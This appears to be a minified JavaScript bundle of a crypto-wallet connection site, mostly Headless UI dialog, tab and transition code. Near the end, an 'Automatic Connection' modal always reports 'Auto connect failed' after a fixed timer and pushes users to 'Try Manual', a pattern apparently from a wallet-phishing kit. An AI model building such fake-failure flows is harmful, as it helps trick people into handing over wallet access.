            id: r = `headlessui-dialog-overlay-${n}`,
            ...l
        } = e,
        [{
            dialogState: o,
            close: i
        }] = Kr("Dialog.Overlay"),
        a = ge(t),
        s = z(f => {
            if (f.target === f.currentTarget) {
                if (Am(f.currentTarget)) return f.preventDefault();
                f.preventDefault(), f.stopPropagation(), i()
            }
        }),
        u = v.useMemo(() => ({
            open: o === 0
        }), [o]);
    return de({
        ourProps: {
            ref: a,
            id: r,
            "aria-hidden": !0,
            onClick: s
        },
        theirProps: l,
        slot: u,
        defaultTag: V0,
        name: "Dialog.Overlay"
    })
}
let K0 = "div";

function Y0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-backdrop-${n}`,
            ...l
        } = e,
        [{
            dialogState: o
        }, i] = Kr("Dialog.Backdrop"),
        a = ge(t);
    v.useEffect(() => {
        if (i.panelRef.current === null) throw new Error("A <Dialog.Backdrop /> component is being used, but a <Dialog.Panel /> component is missing.")
    }, [i.panelRef]);
    let s = v.useMemo(() => ({
        open: o === 0
    }), [o]);
    return F.createElement(Vi, {
        force: !0
    }, F.createElement(Ki, null, de({
        ourProps: {
            ref: a,
            id: r,
            "aria-hidden": !0
        },
        theirProps: l,
        slot: s,
        defaultTag: K0,
        name: "Dialog.Backdrop"
    })))
}
let G0 = "div";

function X0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-panel-${n}`,
            ...l
        } = e,
        [{
            dialogState: o
        }, i] = Kr("Dialog.Panel"),
        a = ge(t, i.panelRef),
        s = v.useMemo(() => ({
            open: o === 0
        }), [o]),
        u = z(f => {
            f.stopPropagation()
        });
    return de({
        ourProps: {
            ref: a,
            id: r,
            onClick: u
        },
        theirProps: l,
        slot: s,
        defaultTag: G0,
        name: "Dialog.Panel"
    })
}
let Z0 = "h2";

function J0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-title-${n}`,
            ...l
        } = e,
        [{
            dialogState: o,
            setTitleId: i
        }] = Kr("Dialog.Title"),
        a = ge(t);
    v.useEffect(() => (i(r), () => i(null)), [r, i]);
    let s = v.useMemo(() => ({
        open: o === 0
    }), [o]);
    return de({
        ourProps: {
            ref: a,
            id: r
        },
        theirProps: l,
        slot: s,
        defaultTag: Z0,
        name: "Dialog.Title"
    })
}
let q0 = oe(H0),
    e1 = oe(Y0),
    t1 = oe(X0),
    n1 = oe(Q0),
    r1 = oe(J0),
    je = Object.assign(q0, {
        Backdrop: e1,
        Panel: t1,
        Overlay: n1,
        Title: r1,
        Description: m0
    });

function l1(e = 0) {
    let [t, n] = v.useState(e), r = Yn(), l = v.useCallback(s => {
        r.current && n(u => u | s)
    }, [t, r]), o = v.useCallback(s => !!(t & s), [t]), i = v.useCallback(s => {
        r.current && n(u => u & ~s)
    }, [n, r]), a = v.useCallback(s => {
        r.current && n(u => u ^ s)
    }, [n]);
    return {
        flags: t,
        addFlag: l,
        hasFlag: o,
        removeFlag: i,
        toggleFlag: a
    }
}

function o1({
    onFocus: e
}) {
    let [t, n] = v.useState(!0), r = Yn();
    return t ? F.createElement(Ir, {
        as: "button",
        type: "button",
        features: Dr.Focusable,
        onFocus: l => {
            l.preventDefault();
            let o, i = 50;

            function a() {
                if (i-- <= 0) {
                    o && cancelAnimationFrame(o);
                    return
                }
                if (e()) {
                    if (cancelAnimationFrame(o), !r.current) return;
                    n(!1);
                    return
                }
                o = requestAnimationFrame(a)
            }
            o = requestAnimationFrame(a)
        }
    }) : null
}
const Wd = v.createContext(null);

function i1() {
    return {
        groups: new Map,
        get(e, t) {
            var n;
            let r = this.groups.get(e);
            r || (r = new Map, this.groups.set(e, r));
            let l = (n = r.get(t)) != null ? n : 0;
            r.set(t, l + 1);
            let o = Array.from(r.keys()).indexOf(t);

            function i() {
                let a = r.get(t);
                a > 1 ? r.set(t, a - 1) : r.delete(t)
            }
            return [o, i]
        }
    }
}

function a1({
    children: e
}) {
    let t = v.useRef(i1());
    return v.createElement(Wd.Provider, {
        value: t
    }, e)
}

function Ud(e) {
    let t = v.useContext(Wd);
    if (!t) throw new Error("You must wrap your component in a <StableCollection>");
    let n = s1(),
        [r, l] = t.current.get(e, n);
    return v.useEffect(() => l, []), r
}

function s1() {
    var e, t, n;
    let r = (n = (t = (e = v.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) == null ? void 0 : e.ReactCurrentOwner) == null ? void 0 : t.current) != null ? n : null;
    if (!r) return Symbol();
    let l = [],
        o = r;
    for (; o;) l.push(o.index), o = o.return;
    return "$." + l.join(".")
}
var u1 = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(u1 || {}),
    c1 = (e => (e[e.Less = -1] = "Less", e[e.Equal = 0] = "Equal", e[e.Greater = 1] = "Greater", e))(c1 || {}),
    d1 = (e => (e[e.SetSelectedIndex = 0] = "SetSelectedIndex", e[e.RegisterTab = 1] = "RegisterTab", e[e.UnregisterTab = 2] = "UnregisterTab", e[e.RegisterPanel = 3] = "RegisterPanel", e[e.UnregisterPanel = 4] = "UnregisterPanel", e))(d1 || {});
let f1 = {
        0(e, t) {
            var n;
            let r = Pn(e.tabs, f => f.current),
                l = Pn(e.panels, f => f.current),
                o = r.filter(f => {
                    var h;
                    return !((h = f.current) != null && h.hasAttribute("disabled"))
                }),
                i = { ...e,
                    tabs: r,
                    panels: l
                };
            if (t.index < 0 || t.index > r.length - 1) {
                let f = Z(Math.sign(t.index - e.selectedIndex), {
                    [-1]: () => 1,
                    0: () => Z(Math.sign(t.index), {
                        [-1]: () => 0,
                        0: () => 0,
                        1: () => 1
                    }),
                    1: () => 0
                });
                if (o.length === 0) return i;
                let h = Z(f, {
                    0: () => r.indexOf(o[0]),
                    1: () => r.indexOf(o[o.length - 1])
                });
                return { ...i,
                    selectedIndex: h === -1 ? e.selectedIndex : h
                }
            }
            let a = r.slice(0, t.index),
                s = [...r.slice(t.index), ...a].find(f => o.includes(f));
            if (!s) return i;
            let u = (n = r.indexOf(s)) != null ? n : e.selectedIndex;
            return u === -1 && (u = e.selectedIndex), { ...i,
                selectedIndex: u
            }
        },
        1(e, t) {
            var n;
            if (e.tabs.includes(t.tab)) return e;
            let r = e.tabs[e.selectedIndex],
                l = Pn([...e.tabs, t.tab], i => i.current),
                o = (n = l.indexOf(r)) != null ? n : e.selectedIndex;
            return o === -1 && (o = e.selectedIndex), { ...e,
                tabs: l,
                selectedIndex: o
            }
        },
        2(e, t) {
            return { ...e,
                tabs: e.tabs.filter(n => n !== t.tab)
            }
        },
        3(e, t) {
            return e.panels.includes(t.panel) ? e : { ...e,
                panels: Pn([...e.panels, t.panel], n => n.current)
            }
        },
        4(e, t) {
            return { ...e,
                panels: e.panels.filter(n => n !== t.panel)
            }
        }
    },
    Xa = v.createContext(null);
Xa.displayName = "TabsDataContext";

function Bn(e) {
    let t = v.useContext(Xa);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Bn), n
    }
    return t
}
let Za = v.createContext(null);
Za.displayName = "TabsActionsContext";

function Ja(e) {
    let t = v.useContext(Za);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Ja), n
    }
    return t
}

function p1(e, t) {
    return Z(t.type, f1, e, t)
}
let m1 = v.Fragment;

function h1(e, t) {
    let {
        defaultIndex: n = 0,
        vertical: r = !1,
        manual: l = !1,
        onChange: o,
        selectedIndex: i = null,
        ...a
    } = e;
    const s = r ? "vertical" : "horizontal",
        u = l ? "manual" : "auto";
    let f = i !== null,
        h = ge(t),
        [m, y] = v.useReducer(p1, {
            selectedIndex: i ? ? n,
            tabs: [],
            panels: []
        }),
        w = v.useMemo(() => ({
            selectedIndex: m.selectedIndex
        }), [m.selectedIndex]),
        x = Be(o || (() => {})),
        N = Be(m.tabs),
        d = v.useMemo(() => ({
            orientation: s,
            activation: u,
            ...m
        }), [s, u, m]),
        c = z(E => (y({
            type: 1,
            tab: E
        }), () => y({
            type: 2,
            tab: E
        }))),
        p = z(E => (y({
            type: 3,
            panel: E
        }), () => y({
            type: 4,
            panel: E
        }))),
        k = z(E => {
            b.current !== E && x.current(E), f || y({
                type: 0,
                index: E
            })
        }),
        b = Be(f ? e.selectedIndex : m.selectedIndex),
        C = v.useMemo(() => ({
            registerTab: c,
            registerPanel: p,
            change: k
        }), []);
    le(() => {
        y({
            type: 0,
            index: i ? ? n
        })
    }, [i]), le(() => {
        if (b.current === void 0 || m.tabs.length <= 0) return;
        let E = Pn(m.tabs, O => O.current);
        E.some((O, P) => m.tabs[P] !== O) && k(E.indexOf(m.tabs[b.current]))
    });
    let T = {
        ref: h
    };
    return F.createElement(a1, null, F.createElement(Za.Provider, {
        value: C
    }, F.createElement(Xa.Provider, {
        value: d
    }, d.tabs.length <= 0 && F.createElement(o1, {
        onFocus: () => {
            var E, O;
            for (let P of N.current)
                if (((E = P.current) == null ? void 0 : E.tabIndex) === 0) return (O = P.current) == null || O.focus(), !0;
            return !1
        }
    }), de({
        ourProps: T,
        theirProps: a,
        slot: w,
        defaultTag: m1,
        name: "Tabs"
    }))))
}
let v1 = "div";

function g1(e, t) {
    let {
        orientation: n,
        selectedIndex: r
    } = Bn("Tab.List"), l = ge(t);
    return de({
        ourProps: {
            ref: l,
            role: "tablist",
            "aria-orientation": n
        },
        theirProps: e,
        slot: {
            selectedIndex: r
        },
        defaultTag: v1,
        name: "Tabs.List"
    })
}
let y1 = "button";

function w1(e, t) {
    var n, r;
    let l = Qt(),
        {
            id: o = `headlessui-tabs-tab-${l}`,
            ...i
        } = e,
        {
            orientation: a,
            activation: s,
            selectedIndex: u,
            tabs: f,
            panels: h
        } = Bn("Tab"),
        m = Ja("Tab"),
        y = Bn("Tab"),
        w = v.useRef(null),
        x = ge(w, t);
    le(() => m.registerTab(w), [m, w]);
    let N = Ud("tabs"),
        d = f.indexOf(w);
    d === -1 && (d = N);
    let c = d === u,
        p = z(P => {
            var A;
            let q = P();
            if (q === Tn.Success && s === "auto") {
                let fe = (A = Va(w)) == null ? void 0 : A.activeElement,
                    it = y.tabs.findIndex(kt => kt.current === fe);
                it !== -1 && m.change(it)
            }
            return q
        }),
        k = z(P => {
            let A = f.map(q => q.current).filter(Boolean);
            if (P.key === De.Space || P.key === De.Enter) {
                P.preventDefault(), P.stopPropagation(), m.change(d);
                return
            }
            switch (P.key) {
                case De.Home:
                case De.PageUp:
                    return P.preventDefault(), P.stopPropagation(), p(() => nt(A, se.First));
                case De.End:
                case De.PageDown:
                    return P.preventDefault(), P.stopPropagation(), p(() => nt(A, se.Last))
            }
            if (p(() => Z(a, {
                    vertical() {
                        return P.key === De.ArrowUp ? nt(A, se.Previous | se.WrapAround) : P.key === De.ArrowDown ? nt(A, se.Next | se.WrapAround) : Tn.Error
                    },
                    horizontal() {
                        return P.key === De.ArrowLeft ? nt(A, se.Previous | se.WrapAround) : P.key === De.ArrowRight ? nt(A, se.Next | se.WrapAround) : Tn.Error
                    }
                })) === Tn.Success) return P.preventDefault()
        }),
        b = v.useRef(!1),
        C = z(() => {
            var P;
            b.current || (b.current = !0, (P = w.current) == null || P.focus({
                preventScroll: !0
            }), m.change(d), Vr(() => {
                b.current = !1
            }))
        }),
        T = z(P => {
            P.preventDefault()
        }),
        E = v.useMemo(() => ({
            selected: c
        }), [c]),
        O = {
            ref: x,
            onKeyDown: k,
            onMouseDown: T,
            onClick: C,
            id: o,
            role: "tab",
            type: zm(e, w),
            "aria-controls": (r = (n = h[d]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            "aria-selected": c,
            tabIndex: c ? 0 : -1
        };
    return de({
        ourProps: O,
        theirProps: i,
        slot: E,
        defaultTag: y1,
        name: "Tabs.Tab"
    })
}
let x1 = "div";

function k1(e, t) {
    let {
        selectedIndex: n
    } = Bn("Tab.Panels"), r = ge(t), l = v.useMemo(() => ({
        selectedIndex: n
    }), [n]);
    return de({
        ourProps: {
            ref: r
        },
        theirProps: e,
        slot: l,
        defaultTag: x1,
        name: "Tabs.Panels"
    })
}
let S1 = "div",
    b1 = Un.RenderStrategy | Un.Static;

function E1(e, t) {
    var n, r, l, o;
    let i = Qt(),
        {
            id: a = `headlessui-tabs-panel-${i}`,
            tabIndex: s = 0,
            ...u
        } = e,
        {
            selectedIndex: f,
            tabs: h,
            panels: m
        } = Bn("Tab.Panel"),
        y = Ja("Tab.Panel"),
        w = v.useRef(null),
        x = ge(w, t);
    le(() => y.registerPanel(w), [y, w]);
    let N = Ud("panels"),
        d = m.indexOf(w);
    d === -1 && (d = N);
    let c = d === f,
        p = v.useMemo(() => ({
            selected: c
        }), [c]),
        k = {
            ref: x,
            id: a,
            role: "tabpanel",
            "aria-labelledby": (r = (n = h[d]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            tabIndex: c ? s : -1
        };
    return !c && ((l = u.unmount) == null || l) && !((o = u.static) != null && o) ? F.createElement(Ir, {
        as: "span",
        ...k
    }) : de({
        ourProps: k,
        theirProps: u,
        slot: p,
        defaultTag: S1,
        features: b1,
        visible: c,
        name: "Tabs.Panel"
    })
}
let N1 = oe(w1),
    C1 = oe(h1),
    T1 = oe(g1),
    P1 = oe(k1),
    j1 = oe(E1),
    Yt = Object.assign(N1, {
        Group: C1,
        List: T1,
        Panels: P1,
        Panel: j1
    });

function _1(e) {
    let t = {
        called: !1
    };
    return (...n) => {
        if (!t.called) return t.called = !0, e(...n)
    }
}

function Go(e, ...t) {
    e && t.length > 0 && e.classList.add(...t)
}

function Xo(e, ...t) {
    e && t.length > 0 && e.classList.remove(...t)
}

function $1(e, t) {
    let n = fn();
    if (!e) return n.dispose;
    let {
        transitionDuration: r,
        transitionDelay: l
    } = getComputedStyle(e), [o, i] = [r, l].map(s => {
        let [u = 0] = s.split(",").filter(Boolean).map(f => f.includes("ms") ? parseFloat(f) : parseFloat(f) * 1e3).sort((f, h) => h - f);
        return u
    }), a = o + i;
    if (a !== 0) {
        n.group(u => {
            u.setTimeout(() => {
                t(), u.dispose()
            }, a), u.addEventListener(e, "transitionrun", f => {
                f.target === f.currentTarget && u.dispose()
            })
        });
        let s = n.addEventListener(e, "transitionend", u => {
            u.target === u.currentTarget && (t(), s())
        })
    } else t();
    return n.add(() => t()), n.dispose
}

function L1(e, t, n, r) {
    let l = n ? "enter" : "leave",
        o = fn(),
        i = r !== void 0 ? _1(r) : () => {};
    l === "enter" && (e.removeAttribute("hidden"), e.style.display = "");
    let a = Z(l, {
            enter: () => t.enter,
            leave: () => t.leave
        }),
        s = Z(l, {
            enter: () => t.enterTo,
            leave: () => t.leaveTo
        }),
        u = Z(l, {
            enter: () => t.enterFrom,
            leave: () => t.leaveFrom
        });
    return Xo(e, ...t.base, ...t.enter, ...t.enterTo, ...t.enterFrom, ...t.leave, ...t.leaveFrom, ...t.leaveTo, ...t.entered), Go(e, ...t.base, ...a, ...u), o.nextFrame(() => {
        Xo(e, ...t.base, ...a, ...u), Go(e, ...t.base, ...a, ...s), $1(e, () => (Xo(e, ...t.base, ...a), Go(e, ...t.base, ...t.entered), i()))
    }), o.dispose
}

function F1({
    immediate: e,
    container: t,
    direction: n,
    classes: r,
    onStart: l,
    onStop: o
}) {
    let i = Yn(),
        a = Ha(),
        s = Be(n);
    le(() => {
        e && (s.current = "enter")
    }, [e]), le(() => {
        let u = fn();
        a.add(u.dispose);
        let f = t.current;
        if (f && s.current !== "idle" && i.current) return u.dispose(), l.current(s.current), u.add(L1(f, r.current, s.current === "enter", () => {
            u.dispose(), o.current(s.current)
        })), u.dispose
    }, [n])
}

function Et(e = "") {
    return e.split(" ").filter(t => t.trim().length > 1)
}
let vo = v.createContext(null);
vo.displayName = "TransitionContext";
var O1 = (e => (e.Visible = "visible", e.Hidden = "hidden", e))(O1 || {});

function R1() {
    let e = v.useContext(vo);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}

function M1() {
    let e = v.useContext(go);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}
let go = v.createContext(null);
go.displayName = "NestingContext";

function yo(e) {
    return "children" in e ? yo(e.children) : e.current.filter(({
        el: t
    }) => t.current !== null).filter(({
        state: t
    }) => t === "visible").length > 0
}

function Bd(e, t) {
    let n = Be(e),
        r = v.useRef([]),
        l = Yn(),
        o = Ha(),
        i = z((y, w = Lt.Hidden) => {
            let x = r.current.findIndex(({
                el: N
            }) => N === y);
            x !== -1 && (Z(w, {
                [Lt.Unmount]() {
                    r.current.splice(x, 1)
                },
                [Lt.Hidden]() {
                    r.current[x].state = "hidden"
                }
            }), o.microTask(() => {
                var N;
                !yo(r) && l.current && ((N = n.current) == null || N.call(n))
            }))
        }),
        a = z(y => {
            let w = r.current.find(({
                el: x
            }) => x === y);
            return w ? w.state !== "visible" && (w.state = "visible") : r.current.push({
                el: y,
                state: "visible"
            }), () => i(y, Lt.Unmount)
        }),
        s = v.useRef([]),
        u = v.useRef(Promise.resolve()),
        f = v.useRef({
            enter: [],
            leave: [],
            idle: []
        }),
        h = z((y, w, x) => {
            s.current.splice(0), t && (t.chains.current[w] = t.chains.current[w].filter(([N]) => N !== y)), t == null || t.chains.current[w].push([y, new Promise(N => {
                s.current.push(N)
            })]), t == null || t.chains.current[w].push([y, new Promise(N => {
                Promise.all(f.current[w].map(([d, c]) => c)).then(() => N())
            })]), w === "enter" ? u.current = u.current.then(() => t == null ? void 0 : t.wait.current).then(() => x(w)) : x(w)
        }),
        m = z((y, w, x) => {
            Promise.all(f.current[w].splice(0).map(([N, d]) => d)).then(() => {
                var N;
                (N = s.current.shift()) == null || N()
            }).then(() => x(w))
        });
    return v.useMemo(() => ({
        children: r,
        register: a,
        unregister: i,
        onStart: h,
        onStop: m,
        wait: u,
        chains: f
    }), [a, i, r, h, m, f, u])
}

function z1() {}
let D1 = ["beforeEnter", "afterEnter", "beforeLeave", "afterLeave"];

function fu(e) {
    var t;
    let n = {};
    for (let r of D1) n[r] = (t = e[r]) != null ? t : z1;
    return n
}

function I1(e) {
    let t = v.useRef(fu(e));
    return v.useEffect(() => {
        t.current = fu(e)
    }, [e]), t
}
let A1 = "div",
    Hd = Un.RenderStrategy;

function W1(e, t) {
    var n, r;
    let {
        beforeEnter: l,
        afterEnter: o,
        beforeLeave: i,
        afterLeave: a,
        enter: s,
        enterFrom: u,
        enterTo: f,
        entered: h,
        leave: m,
        leaveFrom: y,
        leaveTo: w,
        ...x
    } = e, N = v.useRef(null), d = ge(N, t), c = (n = x.unmount) == null || n ? Lt.Unmount : Lt.Hidden, {
        show: p,
        appear: k,
        initial: b
    } = R1(), [C, T] = v.useState(p ? "visible" : "hidden"), E = M1(), {
        register: O,
        unregister: P
    } = E;
    v.useEffect(() => O(N), [O, N]), v.useEffect(() => {
        if (c === Lt.Hidden && N.current) {
            if (p && C !== "visible") {
                T("visible");
                return
            }
            return Z(C, {
                hidden: () => P(N),
                visible: () => O(N)
            })
        }
    }, [C, N, O, P, p, c]);
    let A = Be({
            base: Et(x.className),
            enter: Et(s),
            enterFrom: Et(u),
            enterTo: Et(f),
            entered: Et(h),
            leave: Et(m),
            leaveFrom: Et(y),
            leaveTo: Et(w)
        }),
        q = I1({
            beforeEnter: l,
            afterEnter: o,
            beforeLeave: i,
            afterLeave: a
        }),
        fe = Kn();
    v.useEffect(() => {
        if (fe && C === "visible" && N.current === null) throw new Error("Did you forget to passthrough the `ref` to the actual DOM node?")
    }, [N, C, fe]);
    let it = b && !k,
        kt = k && p && b,
        St = (() => !fe || it ? "idle" : p ? "enter" : "leave")(),
        Qe = l1(0),
        j = z(ye => Z(ye, {
            enter: () => {
                Qe.addFlag($e.Opening), q.current.beforeEnter()
            },
            leave: () => {
                Qe.addFlag($e.Closing), q.current.beforeLeave()
            },
            idle: () => {}
        })),
        $ = z(ye => Z(ye, {
            enter: () => {
                Qe.removeFlag($e.Opening), q.current.afterEnter()
            },
            leave: () => {
                Qe.removeFlag($e.Closing), q.current.afterLeave()
            },
            idle: () => {}
        })),
        L = Bd(() => {
            T("hidden"), P(N)
        }, E);
    F1({
        immediate: kt,
        container: N,
        classes: A,
        direction: St,
        onStart: Be(ye => {
            L.onStart(N, ye, j)
        }),
        onStop: Be(ye => {
            L.onStop(N, ye, $), ye === "leave" && !yo(L) && (T("hidden"), P(N))
        })
    });
    let D = x,
        Y = {
            ref: d
        };
    return kt ? D = { ...D,
        className: Zl(x.className, ...A.current.enter, ...A.current.enterFrom)
    } : (D.className = Zl(x.className, (r = N.current) == null ? void 0 : r.className), D.className === "" && delete D.className), F.createElement(go.Provider, {
        value: L
    }, F.createElement(Hm, {
        value: Z(C, {
            visible: $e.Open,
            hidden: $e.Closed
        }) | Qe.flags
    }, de({
        ourProps: Y,
        theirProps: D,
        defaultTag: A1,
        features: Hd,
        visible: C === "visible",
        name: "Transition.Child"
    })))
}

function U1(e, t) {
    let {
        show: n,
        appear: r = !1,
        unmount: l = !0,
        ...o
    } = e, i = v.useRef(null), a = ge(i, t);
    Kn();
    let s = Ka();
    if (n === void 0 && s !== null && (n = (s & $e.Open) === $e.Open), ![!0, !1].includes(n)) throw new Error("A <Transition /> is used but it is missing a `show={true | false}` prop.");
    let [u, f] = v.useState(n ? "visible" : "hidden"), h = Bd(() => {
        f("hidden")
    }), [m, y] = v.useState(!0), w = v.useRef([n]);
    le(() => {
        m !== !1 && w.current[w.current.length - 1] !== n && (w.current.push(n), y(!1))
    }, [w, n]);
    let x = v.useMemo(() => ({
        show: n,
        appear: r,
        initial: m
    }), [n, r, m]);
    v.useEffect(() => {
        if (n) f("visible");
        else if (!yo(h)) f("hidden");
        else {
            let p = i.current;
            if (!p) return;
            let k = p.getBoundingClientRect();
            k.x === 0 && k.y === 0 && k.width === 0 && k.height === 0 && f("hidden")
        }
    }, [n, h]);
    let N = {
            unmount: l
        },
        d = z(() => {
            var p;
            m && y(!1), (p = e.beforeEnter) == null || p.call(e)
        }),
        c = z(() => {
            var p;
            m && y(!1), (p = e.beforeLeave) == null || p.call(e)
        });
    return F.createElement(go.Provider, {
        value: h
    }, F.createElement(vo.Provider, {
        value: x
    }, de({
        ourProps: { ...N,
            as: v.Fragment,
            children: F.createElement(Vd, {
                ref: a,
                ...N,
                ...o,
                beforeEnter: d,
                beforeLeave: c
            })
        },
        theirProps: {},
        defaultTag: v.Fragment,
        features: Hd,
        visible: u === "visible",
        name: "Transition"
    })))
}

function B1(e, t) {
    let n = v.useContext(vo) !== null,
        r = Ka() !== null;
    return F.createElement(F.Fragment, null, !n && r ? F.createElement(Gi, {
        ref: t,
        ...e
    }) : F.createElement(Vd, {
        ref: t,
        ...e
    }))
}
let Gi = oe(U1),
    Vd = oe(W1),
    H1 = oe(B1),
    ke = Object.assign(Gi, {
        Child: H1,
        Root: Gi
    });

function V1({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    const r = [{
        title: "MetaMask",
        img: "/mm.png"
    }, {
        title: "WalletConnect",
        img: "/wc.png"
    }, {
        title: "LedgerWallet",
        img: "/lw.webp"
    }];
    return g.jsx(g.Fragment, {
        children: g.jsx(ke, {
            appear: !0,
            show: e,
            as: v.Fragment,
            children: g.jsxs(je, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(ke.Child, {
                    as: v.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(ke.Child, {
                            as: v.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(je.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(je.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Connect Wallet"
                                }), g.jsx("div", {
                                    className: "mt-4 flex flex-col gap-4",
                                    children: r.map(l => g.jsxs("div", {
                                        tabIndex: 1,
                                        onClick: () => n(l.title),
                                        className: "flex gap-4 cursor-pointer items-center justify-between border-2 text-gray-900 border-gray-900 transition-all hover:border-indigo-500 hover:bg-indigo-500/10 hover:text-indigo-500 py-2 pl-6 px-3 rounded-full",
                                        children: [g.jsxs("div", {
                                            children: [g.jsx("h6", {
                                                className: "text-base font-medium",
                                                children: l.title
                                            }), g.jsx("p", {
                                                className: "text-sm",
                                                children: "Connect"
                                            })]
                                        }), g.jsx("img", {
                                            src: l.img,
                                            height: 48,
                                            width: 48,
                                            className: l.title === "LedgerWallet" ? "rounded-none" : "rounded-full"
                                        })]
                                    }, l.title))
                                }), g.jsxs("div", {
                                    className: "mt-4 text-xs text-center",
                                    children: ["By connecting a wallet, you agree to the ", g.jsx("span", {
                                        className: "text-indigo-500",
                                        children: "Terms of Service"
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function Q1({
    open: e,
    onClose: t,
    wallet: n,
    handleManual: r
}) {
    const [l, o] = v.useState(!1);
    return v.useEffect(() => {
        e ? setTimeout(() => {
            o(!0)
        }, 3e3) : o(!1)
    }, [e]), g.jsx(g.Fragment, {
        children: g.jsx(ke, {
            appear: !0,
            show: e,
            as: v.Fragment,
            children: g.jsxs(je, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(ke.Child, {
                    as: v.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(ke.Child, {
                            as: v.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(je.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(je.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Automatic Connection"
                                }), l ? g.jsxs("div", {
                                    className: "bg-red-500 text-white mt-4 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [g.jsx("p", {
                                        className: "text-sm",
                                        children: "Auto connect failed"
                                    }), g.jsx("button", {
                                        type: "button",
                                        onClick: r,
                                        className: "text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-5 py-2 text-center",
                                        children: "Try Manual"
                                    })]
                                }) : g.jsxs("div", {
                                    className: "bg-indigo-500/20 text-indigo-500 font-medium mt-4 py-4 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [g.jsx("p", {
                                        className: "text-sm",
                                        children: "Connecting..."
                                    }), g.jsx("svg", {
                                        width: "24",
                                        height: "24",
                                        viewBox: "0 0 24 24",
                                        className: "animate-spin fill-current",
                                        xmlns: "http://www.w3.org/2000/svg",
                                        children: g.jsx("path", {
                                            d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z"
                                        })
                                    })]
                                }), g.jsxs("div", {
                                    className: "mt-4 bg-indigo-500/10 rounded-lg py-3 px-4",
                                    children: [g.jsx("h6", {
                                        className: "text-base font-medium",
                                        children: n
                                    }), g.jsxs("p", {
                                        className: "text-sm",
                                        children: ["Connect to ", n, " and more"]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}
const Cl = {
    "1ce6dae0fea7114845": {
        id: "1ce6dae0fea7114845",
        name: "Binance Smart Chain",
        homepage: "https://www.binance.org/en/smartChain",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114844": {
        id: "1ce6dae0fea7114844",
        name: "SafePal Wallet",
        homepage: "https://safepal.io/",
        chains: ["eip155:1"]
    },
    bfw192192: {
        id: "bfw192192",
        name: "Bifrost wallet",
        homepage: "https://bifrostwallet.com/",
        chains: ["eip155:1"]
    },
    xumm2e093bf3: {
        id: "xumm2e093bf3",
        name: "XUMM Wallet",
        homepage: "https://xumm.app/",
        chains: ["eip155:1"]
    },
    "1c08453": {
        id: "1c08453",
        name: "Coinbase Wallet"
    },
    "1g7023": {
        id: "1g7023",
        name: "Grove Wallet"
    },
    "15473m006": {
        id: "15473m006",
        name: "SafeMoon Wallet"
    },
    14415849: {
        id: "14415849",
        name: "Uniswap Wallet"
    },
    "154174pro": {
        id: "154174pro",
        name: "SaitaPro Wallet"
    },
    "1984670m": {
        id: "1984670m",
        name: "Phantom Wallet"
    },
    "136716n": {
        id: "136716n",
        name: "Enjin Wallet"
    },
    133775474: {
